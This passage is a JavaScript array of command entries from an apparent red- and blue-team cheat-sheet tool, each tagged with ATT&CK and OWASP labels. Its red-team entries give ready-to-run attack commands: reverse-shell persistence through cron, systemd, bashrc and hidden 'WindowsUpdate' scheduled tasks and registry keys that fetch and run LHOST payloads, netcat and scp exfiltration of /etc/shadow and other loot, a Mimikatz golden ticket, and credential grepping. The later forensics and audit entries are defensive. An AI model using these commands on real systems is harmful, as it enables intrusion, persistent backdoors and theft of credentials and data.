      tags: ['interactsh', 'oob', 'receiver', 'callback'], command: 'interactsh-client\n# Generates a unique URL like abc123.oast.fun\n# Use in payloads: curl http://abc123.oast.fun/ssrf-test\n# Monitors DNS, HTTP, SMTP, LDAP callbacks in real-time',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'tools', owasp: ['A10'] },
    { id: 'callback-logger', title: 'HTTP Callback Logger', team: 'red', category: 'receivers',
      description: 'Log all incoming HTTP requests with headers and body — blind injection validator.',
      tags: ['python', 'callback', 'receiver'], command: 'python3 -c "\nimport http.server, json\nclass H(http.server.BaseHTTPRequestHandler):\n  def do_GET(self): self._log()\n  def do_POST(self): self._log()\n  def _log(self):\n    length = int(self.headers.get(\'Content-Length\', 0))\n    body = self.rfile.read(length).decode() if length else \'\'\n    print(f\'\\n=== {self.command} {self.path} ===\')\n    print(dict(self.headers))\n    if body: print(f\'Body: {body}\')\n    self.send_response(200); self.end_headers(); self.wfile.write(b\'ok\')\nhttp.server.HTTPServer((\'0.0.0.0\', 8888), H).serve_forever()\n"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ips', owasp: ['A10', 'A03'] },
    { id: 'dns-listener', title: 'DNS Exfil Listener', team: 'red', category: 'receivers',
      description: 'Catch DNS queries for data exfiltration or OOB detection.',
      tags: ['dns', 'exfiltration', 'receiver'], command: '# Using tcpdump:\ntcpdump -i any -n udp port 53 -l | tee dns_exfil.log\n# Using dnscat2 server:\nruby dnscat2.rb --dns "domain=exfil.DOMAIN" --no-cache',
      killchain: 'actions', attack: ['exfiltration', 'command-control'], pyramid: 'domains', owasp: [] },
    { id: 'smtp-receiver', title: 'SMTP Catch-all Server', team: 'red', category: 'receivers',
      description: 'Local SMTP server that logs all received emails (great for password reset capture).',
      tags: ['python', 'smtp', 'receiver', 'email'], command: 'python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25\n# Or with aiosmtpd:\npython3 -c "\nimport asyncio\nfrom aiosmtpd.controller import Controller\nfrom aiosmtpd.handlers import Debugging\nController(Debugging(), hostname=\'0.0.0.0\', port=25).start()\nasyncio.get_event_loop().run_forever()\n"',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'artifacts', owasp: ['A07'] },
    { id: 'ngrok-tunnel', title: 'Ngrok Tunnel', team: 'red', category: 'receivers',
      description: 'Expose local listener through NAT via ngrok.',
      tags: ['ngrok', 'tunnel', 'receiver'], command: '# HTTP:\nngrok http 8000\n# TCP (for reverse shells):\nngrok tcp LPORT\n# Then use the ngrok URL/port as LHOST in payloads',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'responder-http', title: 'Responder HTTP/SMB Capture', team: 'red', category: 'receivers',
      description: 'Capture NTLM hashes via spoofed HTTP/SMB/WPAD authentication.',
      tags: ['responder', 'ntlm', 'receiver', 'capture'], command: 'responder -I eth0 -wPv\n# Force auth from Windows target:\n# dir \\\\LHOST\\share\n# or: curl https://LHOST/any',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'scp-receive', title: 'SCP File Receive', team: 'red', category: 'receivers',
      description: 'Pull files from target via SCP/SSH.',
      tags: ['ssh', 'scp', 'receiver'], command: '# Pull from target:\nscp USER@TARGET:/etc/shadow ./loot/\n# Pull directory:\nscp -r USER@TARGET:/var/log/ ./loot/logs/\n# Push to target:\nscp payload.sh USER@TARGET:/tmp/',
      killchain: 'actions', attack: ['exfiltration', 'command-control'], pyramid: 'artifacts', owasp: [] },

    // ── Privilege Escalation ─────────────────────────────
    { id: 'linpeas', title: 'LinPEAS', team: 'red', category: 'privesc',
      description: 'Local Linux privilege escalation checks.',
      tags: ['linux', 'privesc', 'linpeas'], command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'winpeas', title: 'WinPEAS', team: 'red', category: 'privesc',
      description: 'Local Windows privilege escalation checks.',
      tags: ['windows', 'privesc', 'winpeas'], command: 'powershell -c "iwr -UseBasicParsing https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile $env:TEMP\\winpeas.exe; Start-Process $env:TEMP\\winpeas.exe"',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'sudo-l', title: 'Sudo Rights Check', team: 'red', category: 'privesc',
      description: 'Identify sudo-based escalation paths.',
      tags: ['linux', 'sudo'], command: 'sudo -l',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'find-suid', title: 'Find SUID Binaries', team: 'red', category: 'privesc',
      description: 'Look for risky SUID binaries.',
      tags: ['linux', 'suid'], command: 'find / -perm -4000 -type f 2>/dev/null',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'linux-capabilities', title: 'Linux Capabilities Check', team: 'red', category: 'privesc',
      description: 'Find binaries with dangerous capabilities (cap_setuid, cap_dac_override, etc.).',
      tags: ['linux', 'capabilities', 'privesc'], command: 'getcap -r / 2>/dev/null\n# Look for: cap_setuid, cap_setgid, cap_dac_override, cap_net_raw',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'writable-paths', title: 'Writable PATH Directories', team: 'red', category: 'privesc',
      description: 'Find writable dirs in PATH for DLL/binary hijacking.',
      tags: ['linux', 'path-hijack', 'privesc'], command: 'for d in $(echo $PATH | tr ":" "\\n"); do [ -w "$d" ] && echo "WRITABLE: $d"; done',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'pspy-process-snoop', title: 'pspy Process Snoop', team: 'red', category: 'privesc',
      description: 'Monitor processes without root — catch cron jobs and scripts running as root.',
      tags: ['pspy', 'privesc', 'linux'], command: 'curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'gtfobins-check', title: 'GTFOBins Exploit Check', team: 'red', category: 'privesc',
      description: 'Check sudo/SUID binaries against GTFOBins for privesc paths.',
      tags: ['linux', 'gtfobins', 'privesc'], command: '# List sudo binaries, then check GTFOBins:\nsudo -l 2>/dev/null | grep -oP "/\\S+" | while read b; do echo "=== $b ===" && curl -s "https://gtfobins.github.io/gtfobins/$(basename $b)/" | grep -c "sudo\\|suid" && echo; done',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-token-priv', title: 'Windows Token Privileges', team: 'red', category: 'privesc',
      description: 'Check current token privileges — SeImpersonatePrivilege = Potato attack.',
      tags: ['windows', 'privesc', 'token'], command: 'whoami /priv\n# If SeImpersonatePrivilege enabled:\n# Use JuicyPotato/PrintSpoofer/GodPotato',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-unquoted-svc', title: 'Unquoted Service Paths', team: 'red', category: 'privesc',
      description: 'Find Windows services with unquoted paths for binary planting.',
      tags: ['windows', 'privesc', 'services'], command: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-always-install', title: 'AlwaysInstallElevated', team: 'red', category: 'privesc',
      description: 'Check if MSI packages always install with SYSTEM privileges.',
      tags: ['windows', 'privesc', 'msi'], command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f msi -o shell.msi',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01', 'A05'] },

    // ── Tunneling & Pivoting ─────────────────────────────
    { id: 'chisel-server', title: 'Chisel Server', team: 'red', category: 'tunnel',
      description: 'Start chisel server for pivoting.',
      tags: ['chisel', 'pivot'], command: 'chisel server --reverse -p 8001',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },
    { id: 'chisel-client', title: 'Chisel Reverse SOCKS', team: 'red', category: 'tunnel',
      description: 'Create reverse SOCKS proxy from target.',
      tags: ['chisel', 'socks', 'pivot'], command: 'chisel client LHOST:8001 R:socks',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-dynamic', title: 'SSH Dynamic SOCKS', team: 'red', category: 'tunnel',
      description: 'SOCKS proxy via SSH.',
      tags: ['ssh', 'socks', 'pivot'], command: 'ssh -D 9050 USER@TARGET',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-local', title: 'SSH Local Port Forward', team: 'red', category: 'tunnel',
      description: 'Forward remote port to local machine.',
      tags: ['ssh', 'pivot'], command: 'ssh -L 8080:127.0.0.1:80 USER@TARGET',
      killchain: 'c2', attack: ['command-control', 'lateral-movement'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-remote', title: 'SSH Remote Port Forward', team: 'red', category: 'tunnel',
      description: 'Expose local port on remote host.',
      tags: ['ssh', 'pivot'], command: 'ssh -R 9090:127.0.0.1:8080 USER@TARGET',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'socat-redirect', title: 'Socat Redirect', team: 'red', category: 'tunnel',
      description: 'Relay traffic between hosts/ports.',
      tags: ['socat', 'pivot'], command: 'socat TCP-LISTEN:8080,fork TCP:TARGET:80',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ligolo', title: 'Ligolo-ng Agent', team: 'red', category: 'tunnel',
      description: 'Lightweight tunneling — agent to proxy.',
      tags: ['ligolo', 'pivot'], command: '# On attacker: ligolo-proxy -selfcert\n# On target:\n./agent -connect LHOST:11601 -ignore-cert',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },

    // ── Persistence ──────────────────────────────────────
    { id: 'persist-cron', title: 'Cron Persistence', team: 'red', category: 'persist',
      description: 'Add reverse shell cron job.',
      tags: ['cron', 'persistence', 'linux'], command: '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") | crontab -',
      killchain: 'installation', attack: ['persistence'], pyramid: 'ttps', owasp: [] },
    { id: 'persist-schtask', title: 'Scheduled Task', team: 'red', category: 'persist',
      description: 'Windows scheduled task for persistence.',
      tags: ['schtasks', 'persistence', 'windows'], command: 'schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -c IEX(IWR https://LHOST/shell.ps1)" /ru SYSTEM',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-service', title: 'Systemd Service', team: 'red', category: 'persist',
      description: 'Create systemd service for persistent access.',
      tags: ['systemd', 'persistence', 'linux'], command: 'cat <<EOF > /etc/systemd/system/update.service\n[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable --now update.service',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-ssh-key', title: 'SSH Authorized Key', team: 'red', category: 'persist',
      description: 'Add your SSH key for persistent access.',
      tags: ['ssh', 'persistence', 'linux'], command: 'mkdir -p ~/.ssh && echo "ssh-rsa AAAA...your-key..." >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-bashrc', title: 'Bashrc Backdoor', team: 'red', category: 'persist',
      description: 'Hide reverse shell trigger in bashrc — runs on every login.',
      tags: ['bash', 'persistence', 'linux'], command: 'echo \'(bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &) 2>/dev/null\' >> ~/.bashrc',
      killchain: 'installation', attack: ['persistence'], pyramid: 'ttps', owasp: [] },
    { id: 'persist-registry-run', title: 'Registry Run Key', team: 'red', category: 'persist',
      description: 'Add startup command via Windows registry.',
      tags: ['windows', 'registry', 'persistence'], command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -ep bypass -w hidden -c IEX(IWR https://LHOST/shell.ps1)" /f',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-winlogon', title: 'Winlogon Helper DLL', team: 'red', category: 'persist',
      description: 'Abuse Winlogon for persistence — payload runs at login.',
      tags: ['windows', 'winlogon', 'persistence'], command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\Temp\\payload.exe" /f',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-golden-ticket', title: 'Golden Ticket (Mimikatz)', team: 'red', category: 'persist',
      description: 'Create a golden ticket for persistent domain access.',
      tags: ['mimikatz', 'kerberos', 'ad', 'persistence'], command: 'mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:NTHASH /ptt" "exit"\n# Verify:\nklist',
      killchain: 'installation', attack: ['persistence', 'credential-access'], pyramid: 'ttps', owasp: [] },

    // ── File Transfer ────────────────────────────────────
    { id: 'download-http', title: 'File Download (Linux)', team: 'red', category: 'transfer',
      description: 'Download a file from attacker host.',
      tags: ['wget', 'curl'], command: 'wget https://LHOST:8000/payload -O /tmp/payload\n# or\ncurl -o /tmp/payload https://LHOST:8000/payload',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'upload-python-http', title: 'Python HTTP Server', team: 'red', category: 'transfer',
      description: 'Host current directory over HTTP.',
      tags: ['python', 'http-server'], command: 'python3 -m http.server 8000',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'smb-share', title: 'SMB Share (Impacket)', team: 'red', category: 'transfer',
      description: 'Temporary SMB share for Windows file transfer.',
      tags: ['smb', 'impacket'], command: 'impacket-smbserver share . -smb2support',
      killchain: 'delivery', attack: ['command-control', 'lateral-movement'], pyramid: 'tools', owasp: [] },
    { id: 'upload-certutil', title: 'Certutil Download', team: 'red', category: 'transfer',
      description: 'Download file on Windows using certutil.',
      tags: ['certutil', 'windows'], command: 'certutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'upload-powershell', title: 'PowerShell Download', team: 'red', category: 'transfer',
      description: 'Download file on Windows using PowerShell.',
      tags: ['powershell', 'windows'], command: 'powershell -c "IWR -Uri https://LHOST:8000/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'exfil-nc', title: 'Exfil via Netcat', team: 'red', category: 'transfer',
      description: 'Transfer file from target to attacker via nc.',
      tags: ['nc', 'exfiltration'], command: '# Attacker: nc -lvnp 9001 > loot.tar.gz\n# Target:\ntar czf - /path/to/loot | nc LHOST 9001',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'exfil-base64', title: 'Base64 File Encode', team: 'red', category: 'transfer',
      description: 'Encode binary for copy-paste exfil.',
      tags: ['base64', 'exfiltration'], command: 'base64 -w0 /path/to/file\n# Decode on attacker:\necho "BASE64STRING" | base64 -d > file',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ttps', owasp: [] },

    // ── Enumeration ──────────────────────────────────────
    { id: 'netstat-linux', title: 'Open Ports (Linux)', team: 'red', category: 'enum',
      description: 'Check listening ports/processes on Linux.',
      tags: ['linux', 'ports'], command: 'ss -tulpen',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'netstat-windows', title: 'Open Ports (Windows)', team: 'red', category: 'enum',
      description: 'Check listening ports/processes on Windows.',
      tags: ['windows', 'ports'], command: 'netstat -ano',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'find-creds', title: 'Find Credentials', team: 'red', category: 'enum',
      description: 'Search for credential strings in configs.',
      tags: ['credentials', 'grep'], command: 'grep -RInE "password|passwd|pwd|secret|token|apikey" /etc /opt /var/www 2>/dev/null',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A02'] },

    // ── Forensics & Incident Response (NEW) ──────────────
    { id: 'volatility-imageinfo', title: 'Volatility Image Info', team: 'blue', category: 'forensics',
      description: 'Identify OS profile for a memory dump.',
      tags: ['volatility', 'memory', 'forensics'], command: 'vol.py -f memory.dmp windows.info',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'volatility-pslist', title: 'Volatility Process List', team: 'blue', category: 'forensics',
      description: 'List running processes from memory dump.',
      tags: ['volatility', 'memory', 'processes'], command: 'vol.py -f memory.dmp windows.pslist',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'volatility-netscan', title: 'Volatility Network Scan', team: 'blue', category: 'forensics',
      description: 'Extract network connections from memory.',
      tags: ['volatility', 'memory', 'network'], command: 'vol.py -f memory.dmp windows.netscan',
      killchain: 'c2', attack: ['command-control', 'discovery'], pyramid: 'tools', owasp: [] },
    { id: 'autopsy-timeline', title: 'Autopsy Timeline', team: 'blue', category: 'forensics',
      description: 'Create a filesystem timeline from disk image.',
      tags: ['autopsy', 'timeline', 'disk'], command: 'fls -r -m "/" disk.img > body.txt && mactime -b body.txt -d > timeline.csv',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'strings-malware', title: 'Strings Analysis', team: 'blue', category: 'forensics',
      description: 'Extract readable strings from a suspicious binary.',
      tags: ['strings', 'malware', 'static'], command: 'strings -n 8 suspicious.exe | grep -iE "http|https|ftp|cmd|powershell|base64" | sort -u',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'pe-analysis', title: 'PE File Analysis', team: 'blue', category: 'forensics',
      description: 'Analyze PE headers and imports of a Windows binary.',
      tags: ['pe', 'malware', 'static'], command: 'python3 -c "import pefile; pe=pefile.PE(\'suspect.exe\'); print(pe.dump_info())"',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    // ── OSINT (NEW) ──────────────────────────────────────
    { id: 'recon-ng', title: 'Recon-ng Framework', team: 'red', category: 'osint',
      description: 'Full-featured OSINT web reconnaissance framework.',
      tags: ['recon-ng', 'osint', 'enum'], command: 'recon-ng -w workspace\nmarketplace install all\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE DOMAIN\nrun',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'spiderfoot', title: 'SpiderFoot OSINT', team: 'red', category: 'osint',
      description: 'Automated OSINT collection across 200+ data sources.',
      tags: ['spiderfoot', 'osint'], command: 'spiderfoot -s DOMAIN -t all -o csv',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'maltego-transform', title: 'Maltego CE', team: 'red', category: 'osint',
      description: 'Visual link analysis and OSINT transforms.',
      tags: ['maltego', 'osint', 'graph'], command: '# Maltego CE: Create new graph > Add entity (Domain: DOMAIN) > Run All Transforms',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'whois-lookup', title: 'WHOIS Lookup', team: 'red', category: 'osint',
      description: 'Query domain registration info.',
      tags: ['whois', 'domain'], command: 'whois DOMAIN',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'dnsenum', title: 'DNS Enumeration', team: 'red', category: 'osint',
      description: 'Enumerate DNS records, zone transfers, brute-force subdomains.',
      tags: ['dnsenum', 'dns'], command: 'dnsenum --dnsserver TARGET --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt DOMAIN',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },

    // ── Malware Analysis (NEW) ───────────────────────────
    { id: 'cuckoo-submit', title: 'Cuckoo Sandbox Submit', team: 'blue', category: 'malware',
      description: 'Submit suspicious file to Cuckoo sandbox for behavioral analysis.',
      tags: ['cuckoo', 'sandbox', 'dynamic'], command: 'cuckoo submit suspicious.exe\n# Check analysis status:\ncuckoo status',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'yara-rule-scan', title: 'YARA Rule Scan', team: 'blue', category: 'malware',
      description: 'Scan directory with YARA rules for malware indicators.',
      tags: ['yara', 'malware', 'detection'], command: 'yara -r rules.yar /path/to/scan',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'hashes', owasp: [] },
    { id: 'virustotal-hash', title: 'VirusTotal Hash Check', team: 'blue', category: 'malware',
      description: 'Query VirusTotal for file hash reputation.',
      tags: ['virustotal', 'hash', 'ioc'], command: 'curl -s "https://www.virustotal.com/api/v3/files/$(sha256sum suspect.exe | cut -d" " -f1)" -H "x-apikey: $VT_API_KEY" | jq .data.attributes.last_analysis_stats',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'hashes', owasp: [] },
    { id: 'remnux-analysis', title: 'REMnux Static Analysis', team: 'blue', category: 'malware',
      description: 'Static analysis pipeline on REMnux distro.',
      tags: ['remnux', 'static', 'malware'], command: 'file suspect.exe && exiftool suspect.exe && ssdeep suspect.exe && pescan suspect.exe',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },

    // ── Incident Response (NEW) ──────────────────────────
    { id: 'ir-collect-linux', title: 'IR Evidence Collect (Linux)', team: 'blue', category: 'ir',
      description: 'Quick evidence collection for incident response.',
      tags: ['ir', 'evidence', 'linux'], command: 'mkdir -p /tmp/ir_evidence && cd /tmp/ir_evidence\ndate > timestamp.txt\nps auxf > processes.txt\nss -tulpen > network.txt\nnetstat -rn > routes.txt\nlast -Faixw > logins.txt\ncat /etc/passwd > users.txt\ncrontab -l > cron.txt 2>&1\nfind / -mtime -1 -type f 2>/dev/null > modified_24h.txt\ntar czf ir_evidence.tar.gz /tmp/ir_evidence/',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'ir-collect-windows', title: 'IR Evidence Collect (Windows)', team: 'blue', category: 'ir',
      description: 'Quick evidence collection on Windows.',
      tags: ['ir', 'evidence', 'windows'], command: 'mkdir C:\\IR_Evidence\nwhoami /all > C:\\IR_Evidence\\user.txt\nnetstat -anob > C:\\IR_Evidence\\network.txt\ntasklist /v > C:\\IR_Evidence\\processes.txt\nwevtutil qe Security /c:100 /f:text /rd:true > C:\\IR_Evidence\\security_events.txt\nschtasks /query /fo TABLE /v > C:\\IR_Evidence\\scheduled_tasks.txt\nreg export HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run C:\\IR_Evidence\\autorun.reg',
      killchain: 'actions', attack: ['collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'thehive-alert', title: 'TheHive Create Alert', team: 'blue', category: 'ir',
      description: 'Create incident alert in TheHive SIRP.',
      tags: ['thehive', 'sirp', 'alert'], command: 'curl -XPOST http://THEHIVE_URL/api/alert -H "Authorization: Bearer $THEHIVE_KEY" -H "Content-Type: application/json" -d \'{"title":"Security Alert","description":"Suspicious activity detected on TARGET","type":"external","source":"Toolbelt","severity":2}\'',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  BLUE TEAM — Defensive Tools / Checks
    // ═══════════════════════════════════════════════════════
    { id: 'blue-fw-rules', title: 'Review Firewall Rules', team: 'blue', category: 'defense',
      description: 'Audit iptables / nftables rules for open ports.',
      tags: ['firewall', 'audit', 'linux'], command: 'iptables -L -n -v\n# or nftables:\nnft list ruleset',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: ['A05'] },
    { id: 'blue-fail2ban', title: 'Fail2ban Status', team: 'blue', category: 'defense',
      description: 'Check fail2ban jails for brute-force protection.',
      tags: ['fail2ban', 'brute-force'], command: 'fail2ban-client status\nfail2ban-client status sshd',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ips', owasp: ['A07'] },
    { id: 'blue-auth-logs', title: 'Auth Log Analysis', team: 'blue', category: 'defense',
      description: 'Search for failed logins and suspicious auth events.',
      tags: ['logs', 'auth', 'linux'], command: 'grep -i "failed\\|invalid\\|error" /var/log/auth.log | tail -50\n# or journalctl:\njournalctl -u sshd --since "1 hour ago" | grep -i fail',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'artifacts', owasp: ['A07', 'A09'] },
    { id: 'blue-process-audit', title: 'Process Audit', team: 'blue', category: 'defense',
      description: 'Check running processes for anomalies.',
      tags: ['processes', 'audit', 'linux'], command: 'ps auxf | grep -v "\\[" | head -50\n# Network connections by process:\nlsof -i -P -n | grep ESTABLISHED',
      killchain: 'installation', attack: ['persistence', 'execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-cron-audit', title: 'Cron Job Audit', team: 'blue', category: 'defense',
      description: 'List all cron jobs across users for backdoor detection.',
      tags: ['cron', 'audit', 'persistence'], command: 'for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -l -u $user 2>/dev/null; done\nls -la /etc/cron.d/ /etc/cron.daily/',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-svc-audit', title: 'Systemd Service Audit', team: 'blue', category: 'defense',
      description: 'Find unusual or recently created systemd services.',
      tags: ['systemd', 'audit', 'persistence'], command: 'systemctl list-units --type=service --state=running\n# Recently modified:\nfind /etc/systemd/system -mtime -7 -name "*.service" -ls',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-network-connections', title: 'Active Connection Check', team: 'blue', category: 'defense',
      description: 'Identify suspicious outbound connections (C2 detection).',
      tags: ['network', 'c2', 'detection'], command: 'ss -tupn state established\n# Unusual DNS:\ntcpdump -i any -n port 53 -c 50',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'blue-dns-monitor', title: 'DNS Query Monitor', team: 'blue', category: 'defense',
      description: 'Watch DNS queries for tunneling or C2 indicators.',
      tags: ['dns', 'monitoring', 'c2'], command: 'tcpdump -i any -n port 53 -l | tee dns_capture.txt',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'domains', owasp: [] },
    { id: 'blue-hash-check', title: 'File Hash Verification', team: 'blue', category: 'defense',
      description: 'Compute hashes and compare against known-good baselines.',
      tags: ['hash', 'integrity', 'audit'], command: 'sha256sum /usr/bin/* | sort > current_hashes.txt\ndiff baseline_hashes.txt current_hashes.txt',
      killchain: 'installation', attack: ['defense-evasion'], pyramid: 'hashes', owasp: ['A08'] },
    { id: 'blue-header-check', title: 'Security Headers Check', team: 'blue', category: 'defense',
      description: 'Inspect HTTP security headers on a web server.',
      tags: ['headers', 'web', 'audit'], command: 'curl -sI https://TARGET | grep -iE "strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy"',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'blue-ssl-check', title: 'SSL/TLS Audit', team: 'blue', category: 'defense',
      description: 'Check certificate and cipher suite configuration.',
      tags: ['ssl', 'tls', 'audit'], command: 'nmap --script ssl-enum-ciphers -p 443 TARGET\n# or:\nopenssl s_client -connect TARGET:443 -brief',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A02'] },
    { id: 'blue-user-audit', title: 'User Account Audit', team: 'blue', category: 'defense',
      description: 'Check for unauthorized accounts and privilege escalation.',
      tags: ['users', 'audit', 'linux'], command: 'awk -F: \'$3 == 0 {print $1}\' /etc/passwd\nawk -F: \'$2 != "!" && $2 != "*" {print $1}\' /etc/shadow\ngetent group sudo',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'blue-schtask-audit', title: 'Scheduled Task Audit (Win)', team: 'blue', category: 'defense',
      description: 'List Windows scheduled tasks for suspicious entries.',
      tags: ['schtasks', 'audit', 'windows'], command: 'schtasks /query /fo TABLE /v | findstr /i "powershell cmd wscript cscript"',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'blue-windows-events', title: 'Windows Event Logs', team: 'blue', category: 'defense',
      description: 'Query security event logs for suspicious activity.',
      tags: ['events', 'audit', 'windows'], command: 'wevtutil qe Security /c:20 /f:text /rd:true\n# Failed logons (4625):\nwevtutil qe Security /q:"*[System[EventID=4625]]" /c:10 /f:text /rd:true',
